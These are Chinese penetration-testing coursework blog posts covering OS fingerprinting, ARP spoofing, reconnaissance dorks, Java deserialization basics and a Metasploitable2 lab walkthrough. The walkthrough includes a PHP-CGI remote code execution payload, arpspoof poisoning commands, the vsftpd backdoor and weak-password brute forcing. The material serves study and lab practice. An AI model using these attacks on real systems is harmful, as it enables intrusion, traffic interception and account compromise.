系统的指纹实际上来源于TCP&#x2F;IP协议栈。TCP&#x2F;IP协议栈技术只是在RFC文档中描述，并没有一个统一的行业标准，各个公司在编写应用于自己的操作系统的TCP&#x2F;IP协议栈时，对RFC文档做出了不尽相同的诠释，造成了各个操作系统在TCP&#x2F;IP协议的实现上有所不同。通过比较不同的操作系统的TCP&#x2F;IP协议栈的细微差异，就可以判定操作系统类型及版本，这种方式也称为“指纹方法学”。 例如我们可以通过ping命令观测TLL值得大小来是否为windows和liunx系统。亦可以使用nmap扫描指定好参数就可以探别系统版本和信息。 TTL即Time to live，是由发送数据包的计算机等设备设置的。数据包每次经过路由转发后，该值都会被减1，当TTL值变为0，该数据包便会被丢弃。 ​ 常见系统的TTL值-&gt;实际探测会因为经过路由不断衰减而改变，但一般大致范围不会变(可计算)，不影响判断。 Windows 9x&#x2F;NT&#x2F;2000 Intel 128Digital Unix 4.0 Alpha 60Linux 2.2.x Intel 64Netware 4.11 Intel 128 参考王轶骏，薛质，李建华的《基于TCP&#x2F;IP协议栈指纹辨识的远程操作系统探测》论文后可以得知：文章内容实现远程操作系统辨识的各种技术类型进行了概括（基于TCPP协议栈的指纹查询和辨识） 通过探测并仔细分析这些TCP&#x2F;IP协议栈指纹的细微差异，就能够精确地辨识出远程操作系统，这就是“栈指纹辨识”(Stack Fingerprinting)技术。最为经典的栈指纹辨识技术由Fydo提出，它通过构造并发送不同类型的数据包（既有正常的也有畸形的数据报）来收集并分析远端操作系统的响应，从而区别不同的TCPP协议栈。这一期间，还出现了基于初始序列号(ISN)采样的指纹辨识技术[)。这些技术都已在Nmp和Queso等经典的工具中得到了体现，在此就不再赘述。此后，真正在指纹辨识方法学上有所突破的则是以下两种：基于TO(重传超时时间)采样的辨识技术和基于引CMP响应的辨识技术。 1--《基于TCP/IP协议栈指纹辨识的远程操作系统探测》 TCP 与 ICMP 指纹识别对操作系统的扫描大多是通过TCP&#x2F;IP协议簇进行的。应因为TCP&#x2F;IP是互联网的基础协议，网络上所有的通信交互都通过该协议簇进行，所以操作系统OS想要与外界通信（这是必然的）一定要实现该协议。这些标记对操作系统特别重要，每个操作系统根据数据包的不同类型做出不同的反应，如果是TCP包就发送 到系统自己的网络栈。 ICMP协议也经常被用来进行指纹识别。许多traceroute功能使用ICMP协议发现起点到目标的网络路径。如果数据报没有被正确 处理，不管是设备没有激活还是数据报自己的问题，ICMP都会返回错误消息，这些错误消息有时也很有用。 本机实验本机环境下的域下有多台靶机，实验使用kali,Ubuntu,windows7进行实验。 ip地址分别win7:192.168.65.138,ubuntu:192.168.65.137 分别ping两台主机，得到结果： 可以看到win系统的TTL值为128，liunx（Ubuntu）系统的TTL值为：64.因为是本地主机并未经过路由，因此TTL并未减小。 使用TCP&#x2F;UDP进行路由追踪可以看到（未经过其他路由转发）： 通过nmap扫描系统类型可以看到： 通过比较不同的操作系统的TCP&#x2F;IP协议栈的细微差异，可以识别出OS类型甚至是具体版本。"},{"title":"网络安全测试课程-作业-4","path":"/2023/11/27/wang-luo-an-quan-ce-shi-ke-cheng-zuo-ye-4/","content":"ARPARP协议 arp（Address Resolution Protocol），即地址解析协议，属于数据链路层，是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。 cmd查看arp -a 在以太网中，同一局域网中的一台主机想要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP&#x2F;IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议含有的上层IP协议提供的数据中，只包含目的主机的IP地址。所以需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。ARP高速缓存是实时更新的，每次开机后会清空缓存并重新获取。 如果本机想与某台主机通信，则首先在ARP高速缓存(动态更新)中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间。 ​ ARP请求广播到局域网络上的所有主机 ARP表 网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在数据传送前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP 报文来获取。获取到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期（一般为关机前）内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。 ARP欺骗当有2台或者多台计算机进行交互时，例如主机A与主机B进行交互，A在已知B的IP，但不知到B的MAC地址时，是无法通信的。 当A主机上在查询Arp缓存时未能找到B的MAC地址时，会进行广播到本地网络上的所有主机（发送的数据包含A的Ip与MAC地址），主机B的IP与广播中所请求的IP地址相同时，主机B将A的IP地址和MAC地址映射添加到本地ARP缓存中。同时主机B将包含其MAC地址的ARP回复消息直接发送回主机A。当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。 此时，由于主机A并不会验证B发送的回复包是否具有真实性，因此我们可以伪造成B发送回复包。例如: 1234graph LR; A[主机A]--ip,mac,B的ip,询问B的MAC--&gt;B[主机B] C[攻击机]--疯狂回复A,B的ip,MAC--&gt;A1[主机A] 断网攻击类型： 1.主机欺骗：欺骗对象为主机。 2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。 利用工具： ​ kali ：arpspoof 用法：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host。 参数： -i interface 指定要使用的接口（即指定一块网卡） -t target 指定一个将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）可以重复指定多个主机 host host是你想要截获数据包的主机(通常是网关) -c own|host|both 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。 -r 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效） 注意：在使用arp欺骗前先开启Kali的IP转发，使用命令： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 参数举例：arpspoof -i eth0 -t 192.168.0.103 192.168.0.107。 即： arpspoof -i 网卡 -t 目标IP 网关。 DHCPDHCP协议DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），前身是BOOTP协议，是一个局域网的网络协议，使用UDP协议工作，统一使用两个IANA分配的端口：67（服务器端），68（客户端）。在TCP&#x2F;IP网络中对客户机动态分配和管理IP地址等配置信息，以简化网络配置，方便用户使用及管理员的管理。 •一台DHCP服务器可以是一台运行Windows Server、UNIX或Linux的计算机，也可以是一台路由器或交换机。 DHCP 的安全问题非法DHCP服务器接入到了网络中；“冒充”为这个网段中的合法DHCP服务器。 DNS服务DNS作用-主机IP地址与主机名之间的对应关系。 起初是随着接入网络主机的增多，这种数字标识的地址非常不便于记忆，unix便建立一个叫做hosts的文件 ， 这个文件中记录这主机域名和IP地址的对应表。这样只要输入主机名称，系统就会去加载hosts文件并查找对应关系，找到对应的IP，就可以访问这个IP的主机了。之后再Linux和windows也继承了这个文件。 而DNS服务器用于集中报存hosts文件，用于用户方便查询和实时更新hosts数据。DNS协议运行在UDP协议之上，使用端口号53。 ​ 域名查询图 客户端先从本地计算机上查询域名对应的ip，如果未查询到，便访问DNS服务器（8.8.8.8 ，114.114.114.114）ip去查询域名对应的ip,若还未查询到便访问上一级DNS服务器直到根服务器位置，并返回数据。 NAT服务NAT（Network Address Translator，网络地址转换）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决IPv4地址短缺而开发的技术。 NAT工作原理内容参考[《什么是NAT》](什么是NAT？ - 知乎 (zhihu.com)) ​ 网络被分为私网和公网两个部分，NAT网关设置在私网到公网的路由出口位置，双向流量必须都要经过NAT网关； 网络访问只能先由私网侧发起，公网无法主动访问私网主机； NAT 路由器在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换； NAT 路由器的存在对通信双方是保持透明的； NAT 路由器为了实现双向翻译的功能，需要维护一张关联表，把会话的信息保存下来。 NAT可以划分为以下两种类型：源网络地址转换-Source NAT-SNAT;目的网络地址转换-Destination NAT-DNAT。 主机 163.221.120.9 的端口号是 80，私网中有 2 个客户端 10.0.0.10 和 10.0.0.11 同时进行通信，并且这 2 个客户端的本地端口都是 1025。此时，仅仅转换 IP 地址为全局地址 202.244.174.37 ，会令转换后的数字完全一致。因此，为了区分这 2 个会话，只要将 10.0.0.11 的端口号转换为 1026 就可以解决问题。NAPT 路由器通过生成转换表，就可以正确地转换地址跟端口的组合，使客户端A、B能同时与服务器之间进行通信。 关键点：利用端口号的唯一性实现了公网 IP 到私网 IP 的转换，理论上最多可以让 65535 台主机共用一个公网 IP 地址","tags":["网络渗透测试基础知识,DNS,ARP"],"categories":["网络渗透测试基础知识"]},{"title":"网络安全测试课程-作业-3","path":"/2023/11/20/wang-luo-an-quan-ce-shi-ke-cheng-zuo-ye-3/","content":"TCP&#x2F;IP协议TCP 提供面向有连接的通信传输，面向有连接是指在传送数据之前必须先建立连接，数据传送完成后要释放连接。 无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP&#x2F;IP协议中，TCP协议提供可靠的连接服务，连接是通过三次握手进行初始化的。同时由于TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议，TCP是全双工模式，所以需要四次挥手关闭连接。 SYN：简写为S，同步标志位，用于建立会话连接，同步序列号； ACK： 简写为.，确认标志位，对已接收的数据包进行确认； FIN： 简写为F，完成标志位，表示我已经没有数据要发送了，即将关闭连接； PSH：简写为P，推送标志位，表示该数据包被对方接收后应立即交给上层应用，而不在缓冲区排队； RST：简写为R，重置标志位，用于连接复位、拒绝错误和非法的数据包； URG：简写为U，紧急标志位，表示数据包的紧急指针域有效，用来保证连接不被阻断，并督促中间设备尽快处理。 TCP(Transfer Control Protocol，传输控制协议)和IP(Internet Protocol，网际协议)TCP&#x2F;IP演变为一种体系结构，即TCP&#x2F;IP参考模型。现在的TCP&#x2F;IP已成为一个工业标准的协议集，它最早应用于ARPAnet。 TCP&#x2F;IP是一个协议簇或协议栈，是由多个子协议组成的集合。 与OSI参考模型不同，TCP&#x2F;IP模型由应用层(Application Layer)、传输层(Transport Layer)、网际层(Internet Layer，也称为Internet层)和网络接口层(Network Interface Layer)四部分组成。 ​ TCP&#x2F;IP 体系中的主要协议及与各层的对应关系 网络接口层 网络接口层属于最低的一层，它负责通过网络发送和接收分组(帧Frame)。 交换机、MAC 地址、通信媒体 定义 MAC( Media Access Control Address ) 地址 物理地址 - 网卡地址 - 硬件地址 48bit： 6 8 字节，十六进制描述 （例如Mac地址） 唯一性 确实存在，不能更改 网际层• 也称为“互联网络层” • 它相当于OSI参考模型网络层的无连接网络服务。网际层的任务是：允许位于同一网络或不同网络中的两台主机之间以分组(包Packet)的形式进行通信。 路由器、路由选择、转发分组 、IP 地址 ACL（访问控制列表）、防火墙、NAT **IP 地址： 32bit ** 点分十进制描述 随着网络规划 可更改 传输层 允许在源和目的主机的对等体之间进行会话，负责会话对等体的应用进程之间的通信。功能类似于OSI参考模型传输层的功能。 进程 Port端口(也是个地址)、TCP、UDP 应用层 最高层。应用层主要包括根据应用需要开发的一些高层协议，如HTTP、DNS、DHCP、telnet、FTP、SMTP、SNMP、等。随着网络应用的不断发展，新的应用层协议还会不断出现。 应用有关、用户、域名 TCP&#x2F;IP网络中分组的传输示例 子网-网络由多个子网(Subnetwork)组成，每一个子网属于某一种特定类型的网络，局域网中的以太网、令牌环网、FDDI，广域网的x.25、帧中继等。 网络接入协议-计算机接入网络，必须使用这一子网中规定的接入协议。通过网络接入协议，可以让一台主机将数据通过子网发送到其他的主机。 路由器-它是连接不同子网的设备，一台路由器相当于一个中继站，将一个IP分组从某一子网中的一台主机通过一个或多个子网发送到目的主机。 全局地址: 对于Internet等互联网络来说，每一台主机必须拥有一个全网唯一的IP地址作为其身份的唯一标识，这个IP地址称为全局地址。当源主机发送数据到目的主机时，源主机首先要知道目的主机的IP地址。(NAT技术) 端口: 主机中的每一个进程必须具有一个在本主机中唯一的地址，这个地址称为端口（port）。通过端口，端到端的协议（如TCP）才能够将数据正确地交付给相应的进程。 wireshark简介Wireshark是一个免费的开源 数据包分析器。它用于网络故障排除、分析、软件和通信协议开发以及教育。–wikipedia 详细简介参考《工具: Wireshark介绍及抓包分析》 。与之相同的还有Charies软件（可以在开发中调试端口外，Charles也可以用于分析第三方应用的通讯协议，配合Charles的SSL功能，还可以分析HTTPS协议）可以用于在PC处使用模拟器抓取app软件。 抓取旧版QQ消息 选取已连接的网卡，这里选取WLAN，输入oicq抓取qq流量数据。 此处可以看到相应的网络路由设备厂商，服务端口，网络协议，QQ号码等信息 发送一张png图片进行获取 选择tcp流查找png的16进制文件头：FFD8,右键追踪流并另存为xx.png,用winHex打开","tags":["网络渗透测试基础知识,wireshark"],"categories":["网络渗透测试基础知识"]},{"title":"网络安全测试课程_作业_2","path":"/2023/11/14/wang-luo-an-quan-ce-shi-ke-cheng-zuo-ye-2/","content":"课堂总结主动扫描主动扫描一般都是针对目标发送特定的数据包，然后根据目标的反应来获得一些信息。大多为利用爬虫模块对特定链接的GET,POST，Headers等请求的参数进行变形，然后重放并根据返回的数据包的信息或状态码进行判断。其行为有可能被目标系统查获。 以nmap为例可以通过ping ,ARP,TCP,UDP等协议进行主动扫描 当目标主机与我们处于同一网段时，使用ARP协议扫描不仅速度最快而且扫描结果也是十分精准 对于大量主机扫描时，可以使用ping协议扫描，较为快速 TCP协议扫描时一般情况下使用较多的扫描方式 UDP协议扫描多用于非TCP协议建立连接的扫描 被动扫描相较于主动扫描，被动扫描多是通过系统发出的包进行判断或通过流量、代理等方式去采集测试数据源。与目标系统不产生交互。 扫描的范围多为域名，子域名，指纹等资产。 123456graph LRA(被动扫描范围) --&gt;B[域名]--&gt;C[子域名]A--&gt;D[是否含有CDN,WAF等等] CDN即內容分发网络（英语：Content Delivery Network或Content Distribution Network，缩写：CDN）是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。 google hacking语法基本搜索 逻辑与：and 逻辑或： or 逻辑非： - 完整匹配：”关键词” 通配符：* ? 高级搜索intext: 寻找正文中含有关键字的网页 intitle: 寻找标题中含有关键字的网页 allintitle: 用法和intitle类似，只不过可以指定多个词 inurl 将返回url中含有关键词的网页 site: 指定访问的站点 filetype: 指定访问的文件类型 link: 指定链接的网页 搜索引擎：ZoomEye 工业控制系统 图片信息 metadataExif专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。如GPS等隐私信息。 在kali里可通过exiftool 图片来查看图片的exif信息 信息收集–字典 字典爆破与生成有着多款工具可以使用，其中kali自带Hydra爆破工具。pydictor可以基于网页内容自定义密码，同时支持增插删改自定义密码内容。而Hascat支持MD5等多种hash算法可用于rar,pdf,office,windows账户进行破解。 搜索引擎常用的有ZooEye ,fofa,360quark等，每种产品功能基本相同，多用于搜索指定网站，CMS等。尤其是在SRC挖掘，攻防演练中。 网络安全搜索引擎相关语法 = ：匹配，=\"\"时，可查询不存在字段或者值为空的情况。 == ：完全匹配，==\"\"时，可查询存在且值为空的情况。 && ：与 || ：或者 != ：不匹配，!=\"\"时，可查询值为空的情况。 *= ：模糊匹配，使用*或者?进行搜索，比如banner*=\"mys??\" (个人版及以上可用)。 () ：确认查询优先级，括号内容优先级最高。 app：组件名称 ver：组件版本 app:apache ver:2.4 搜索 apache 2.4 port：搜索端口号 port:22 搜索开放了SSH端口的主机 OS：搜索指定的操作系统 OS:linux service：服务名称 Service:SSH 搜索SSH服务 country：国家名 city：城市名 country:China city: Beijing Device：搜索指定的设备类型，divice:router ip:搜索特定的IP地址，ip:192.168.1.1 cidr：指定的CIDR网段 CIDR：192.168.158.12/24 Service：搜索指定的服务类型，service:http Hostname：guet.edu.cn icp=\"京ICP证030173号\"：查找备案号为“京ICP证030173号的网站 作业•与ZoomEye功能类似的搜索引擎还有哪些？相似的有很多，比如fofa,360quark，鹰眼等 每种引擎功能大多相似。用于对企业所有暴露在公网的暴露面进行梳理,迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计等，帮助企业最大程度上保护自己的互联网资产。 利用ZoomEye进行相关搜索，截图例如搜索运行在中国的apahce服务： 语法：app:apache &amp;&amp; country:china 子域名收集这里利用layer子域名收集工具来完成。对guet.edu.cn进行暴力扫描（也可以用kali自带的TheHarvester） TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。 以外发现了学校网盘和超速管理界面。。。。 题外化发现一处异常网址 Apache Tomcat 是8.5.42版本，版本符合一个CVE。。。。。","tags":["网络渗透测试基础知识,kali,网卡与路由"],"categories":["网络渗透测试基础知识"]},{"title":"JAVA安全入门学习一","path":"/2023/11/12/java-an-quan-ru-men-xue-xi-yi/","content":"制胜法宝(不是) JAVA安全学习路线 IDEA Maven Java Web 反射 ASM/Javassist JNDI：8u191低版本和高版本怎么打(反序列化/本地工厂)，以及如何审计 RMI是什么 Java Agent：启动原理和RASP的实现原理 JMX/JDWP 反序列化基础：gadget链、JEP290是什么 FastJson反序列化 WebLogic：二次反序列化、XML Decoder、IIOP/T3 Xstream反序列化 Hessian反序列化：dubbo SnakeYAML反序列化 Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马 Struts2 Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用 Tomcat：Tomcat AJP RCE 内存马原理：原理是什么、有哪些内存马 内存马如何查杀 Log4J 其他组件漏洞：Apache Solr、Flink 进阶：tabby、codeql等静态分析 ### 序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。 字节，也就是byte *，1byte &#x3D; 8bit，也就是一个字节等于8位，每一位都是用0或者1来表示，在内存中，数据就是以 二进制 的形式存储的 序列化是将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。 Java其自身是有一套序列化机制，可以把Java对象序列化成字节序列，还可以把自己序列再通过反序列化还原成原来的对象！ JAVA序列化样例序列化在 Java 中是通过 &#96;&#96;java.io.Serializable &#96;接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。 例如以下序列化代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.io.IOException;import java.io.ObjectOutputStream;import java.io.Serializable;import java.io.FileOutputStream;public class SerializeDemo&#123; public static void main(String [] args) &#123; Employee e = new Employee(); e.name = &quot;Reyan Ali&quot;; e.address = &quot;Phokka Kuan, Ambehta Peer&quot;; try &#123; FileOutputStream fileOut =new FileOutputStream(&quot;./employee.ser&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(e); out.close(); fileOut.close(); System.out.printf(&quot;Serialized data is saved in /tmp/employee.ser&quot;); &#125;catch(IOException i) &#123; i.printStackTrace(); &#125; &#125;&#125;---同目录下Employee.java文件 import java.io.Serializable;public class Employee implements Serializable &#123; public String name; public String address;&#125;--反序列化代码 Employee obj = null; try &#123; FileInputStream fileIn = new FileInputStream(&quot;./employee.ser&quot;); ObjectInputStream in = new ObjectInputStream(fileIn); obj = (Employee ) in.readObject(); in.close(); fileIn.close();&#125; catch (IOException i) &#123; i.printStackTrace();&#125; catch (ClassNotFoundException i) &#123; i.printStackTrace();&#125;System.out.println(&quot;Deserialized Employee...&quot;);System.out.println(&quot;Name: &quot; + e.name); 可以看到已写入二进制文件ser中 JAVA序列化–接口接口通常以interface来声明。接口并不是类，虽然接口的编写方式和类很相似，但是它们属于不同的概念。 类描述对象的属性和方法。接口则包含类要实现的方法。 接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。 接口文件保存在 .java 结尾的文件中，文件名使用接口名。接口的字节码文件保存在 .class 结尾的文件中。接口相应的字节码文件必须在与包名称相匹配的目录结构中。接口不能用于实例化对象。接口没有构造方法。接口不能包含成员变量，除了 static 和 final 变量。 接口的声明格式： 123public interface 接口名称 [extends 其他的接口名] &#123; // 变量与抽象方法&#125; 在序列化中要使用implements Serializable (实现Serializable接口)接口什声明此类可以被序列化 Serializable 类中没有任何方法和属性但一定要声明,用来表示这个类允许把对象转换为流形式储存和传输。 安全问题只要服务端反序列化数据，客户端传递类的readObject中的代码便会自动执行，从而使恶意代码可以在服务器上执行。 readObject()简介readObject()是ObjectInputStream类中的一个方法,它用于从输入流中反序列化对象。 ObjectInputStream可以序列化对象到输出流,同时也可以从输入流中反序列化对象。readObject()方法就是用于对象的反序列化。 readObject()方法的具体作用和过程: 从输入流(如FileInputStream)中读取serialized对象的描述信息。 根据描述信息反序列化对象,将对象重构并创建在JVM内存中。 返回反序列化后的对象引用。 通过readObject()可以反序列化get shell等。 会先做ctfshow的java的基础题，等到序列化后在更新 。。。","tags":["JAVA安全,序列化"],"categories":["JAVA安全"]},{"title":"网络安全测试课程_作业_1","path":"/2023/11/08/wang-luo-an-quan-ce-shi-ke-cheng-zuo-ye-1/","content":"网络安全测试课程_作业一VM下虚拟机网络配置信息VM下的虚拟机网络信息不同于PVE下的网络配置信息（PVE下多为vmbr0(0为编号)下的桥接模式）。 在VM下以kali为例子,在网络适配器下，存在三种模式：桥接模式，NAT模式，仅主机模式。 存在两个网卡(在未安装docker，ks8等特殊情况下)VMnet0：用于桥接模式下的虚拟交换机，VMnet1：用于虚拟桥接网络下的虚拟交换机,VMnet8：用于虚拟 NAT 网络下的虚拟交换机。 桥接模式桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 NAT模式NAT 模式，就是让虚拟系统借助 NAT（网络地址转换）功能，通过宿主机器所在的网络来访问公网。也就是说，使用 NAT 模式可以实现在虚拟系统里访问互联网，但前提是主机可以访问互联网。 NAT 模式下的虚拟系统的 TCP&#x2F;IP 配置信息是由 VMnet8（NAT）虚拟网络的 DHCP 服务器提供的，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。 访问路径为虚拟机ip-&gt;主机-&gt;互联网 仅主机模式仅主机模式的虚拟网络是一个封闭的网络环境，使得虚拟机成为一个独立的系统，所以多个虚拟机之间也可以互相访问，但一般情况下虚拟网络不能连接到 Internet。主机和虚拟机之间的通信是通过 VMnet1 虚拟网卡来实现的。此时如果想要虚拟机上外网则需要主机联网并且网络共享。 相关配置命令win下可liunx下查看ip的一种方式： win下查看路由表 加入想要通过vpn访问另一台主机上的虚拟机可以使用route add ip mask 255.255.255.0 metric 接口列表 ，来访问。 kali下ip的配置文件为&#x2F;etc&#x2F;network&#x2F;interfaces 该文件文件不同于centos的conf配置信息 若为静态，应做如下设置： 12345678910111213141516# This file describes the network interfaces available on your system# and how to activate them. For more information， see interfaces（5）。# The loopback network interfaceauto lo iface lo inet loopback auto eth0 iface eth0 inet static //配置eth0使用默认的静态地址 address 192.168.1.1 //设置eth0的IP地址 netmask 255.255.255.0 //配置eth0的子网掩码 gateway 192.168.1.0 //配置当前主机的默认网关``` 实践作业Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？操作完成后。查看IP，发现，并不存在 所以无法获得IP地址 但在手机热点或其他wifi下，kali在桥接模式下时可以获得ip，并在物理机上可以访问到的，且局域网内其他主机也可访问到。 Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？ 操作完成后。查看IP，发现可以获得 注意事项，在win11 上连接热点时，最好将网络配置文件类型设置为”公用网络（推荐）“，同时重启网络。 对于1、2的结果，进行总结分析。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 在校园网环境下，易出现不一致情况，当然也可能是校园网的网络设置就是这样。 解决方法 将红框内的改为列表中主机使用的网络 WLAN勾选红框内容 设置ip在同一网段下，网关不变。 此时发现已经连接成功！！！ 作业完成!!!!","tags":["网络渗透测试基础知识,kali,网卡与路由"],"categories":["网络渗透测试基础知识"]},{"title":"Metasploitable2靶机本地练习记录","path":"/2023/11/04/metasploitable2-ba-ji-ben-di-lian-xi-ji-lu/","content":"Metasploitable2靶机本地练习记录信息搜集靶机ip: 192.168.80.129（位置） kali下对整个c端扫描 nmap -sn 192.168.80.0&#x2F;24 (ping扫描)（arp-scan -l) 找到位置ip：192.168.80.129 端口扫描 nmap （-sS) -sT –min-rate 10000 -p- 192.168.80.129 -OA nmapscan&#x2F;ports 获得端口后提取到txt文本 grep open nmapscan&#x2F;ports.nmap | awk -F ‘&#x2F;‘ ‘{print $1}’ | paste -sd ‘,’ 写入变量$ports中方便后续使用 查看靶机详细信息 nmap -sT -sV -O -p$ports(tab) 192.168.80.129 -oa nmapscan&#x2F;detail 获得各个开放端口的应用信息： 21端口攻击 扫描结果返回为ftp 2.3.4版本。google得知为vsftpd笑脸漏洞msf下验证并执行playload（这个有匿名登入的风险，后面会讲到） 找到对应版本后，set参数并run命令 直接拿到root权限 22端口攻击 nmap下sV扫描版本信息为 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)，msf直接搜索漏洞未果，那么有可能像ftp匿名登录或者弱口令，利用hydra直接爆破 hydra 192.168.206.216 -L user字典 -P passwd字典 -u IP ssh,由于没得字典，所以利用了其他工具得到账户msfdamin&#x2F;msfadmin ,但是没想到还扫出来多个弱口令，比如ftp的匿名登录 kali下登录ssh &#109;&#x73;&#x66;&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x38;&#48;&#46;&#x31;&#x32;&#x39; 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户） 23端口攻击 版本信息为telnet服务，同样是弱口令，根据靶机特性，一般所有服务多为同一账户密码。开始是思路为同样可通过22端口攻击的方式复刻出来，账户密码为msfadmin&#x2F;msfadmin。shell下&gt;远程登入即可拿到当前用户的shell。但登入是它直接告诉你了账户密码（-__-）。 25与53端口攻击 smtp协议多用于邮件传输当中,此处漏洞同样为弱口令,账户密码:msfadmin&#x2F;msfadmin domain称网域，是由一串用点分隔的名字组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）目前还不会,以后在更新 80端口攻击打开网站查看: 目录扫描没有得到可用结果 里面自带以下漏洞靶场便不做演示 以下利用的其他漏洞，访问phpinfo.php得到php版本信息为：php为5.24，存在[PHP-CGI远程&gt;代码执行漏洞CVE-2012-1823] 其就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求&gt;所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了&gt;一系列结果。CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行&gt;的php中 在文件后接**?-s**后会显示出源码,例如 远程rce的poc为 1/-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input 1POST: &lt;?php echo system(&quot;ls -al&quot;); ?&gt; cgi模式下的参数 -c 指定php.ini文件的位置 n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -s 显示文件源码 -T 执行指定次该文件 -h和-? 显示帮助 445端口利用该端口利用为CVE-2010-0926。 nmap扫描得到445端口信息为 netbios-ssn Samba smbd 3.X - 4.X 。msf查找相关漏洞，并利用 利用auxiliary&#x2F;admin&#x2F;smb&#x2F;samba_symlink_traversal模块进行攻击 1234show optionsSet RHOST 192.168.80.129 set SMBSHARE tmp 设置SAM可写文件exploit 利用成功，输入smbclient &#x2F;&#x2F;192.168.80.129&#x2F;tmp（提示输入密码处，直接回车即可），之后切换rootfs即可利用成功 6667端口攻击 待续。。。。","tags":["CVE,靶机,Metasploitable2"],"categories":["靶机"]},{"title":"红蓝对抗-信息搜集(1)","path":"/2023/11/01/hong-lan-dui-kang-xin-xi-sou-ji-1/","content":"资产架构一个网站-&gt;存在多个程序&#x2F;端口应用，任何一个程序和应用出现漏洞，都可以进行安全测试 同一域名下含有多个网站-&gt; bbs.recyvan.com与edu.recyvan.com同在192.168.4.123下 网站下多有各种插件(本身与接口)，api . web应用 web单个源码指向安全 web多个目录源码安全-&gt;框架目录 we多个端口源码安全—&gt;ftp匿名登入 服务器架设多个站点安全 架设第三方插件接口安全 服务器架设多个应用安全 番外安全基于域名解析安全 基于服务器本身的安全 基于服务商信息安全 基于管理个人的安全 考虑阻碍阻碍-站库分离 阻碍-CDN边加速服务 阻碍-负载均衡服务 阻碍-WAF应用防火墙 阻碍-主机防火墙 打点知识点fofa，钟馗之眼，撒旦，360quark，站长之家，lay子域名,云溪指纹(www.yunsee.cn)等指纹搜集 